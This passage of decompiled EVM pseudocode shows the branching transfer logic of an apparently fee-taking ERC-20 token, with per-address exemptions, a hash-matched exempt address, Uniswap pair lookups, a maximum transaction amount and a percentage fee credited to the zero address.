                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7166 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7184 = mem[_7166]
                        require mem[_7166] == mem[_7166 + 12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7232 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7263 = mem[_7232]
                        require mem[_7232] == mem[_7232 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7263)
                        require ext_code.size(address(_7184))
                        staticcall address(_7184).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7263)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7427 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7499 = mem[_7427]
                        require mem[_7427] == mem[_7427 + 12 len 20]
                        if mem[_7427 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7865 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7865 + 32 len mem[_7865]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7499):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7899 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7899 + 32 len mem[_7899]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
    else:
        mem[128] = address(arg1)
        mem[96] = 20
        if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
            if stor18:
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).factory() with:
                        gas gas_remaining wei
                mem[148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 152] = this.address
                mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 148
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if arg1 == this.address:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor18:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor19[stor19.length].field_256 = arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if not arg2:
                                    revert with 'NH{q', 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor19[stor19.length].field_256 = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
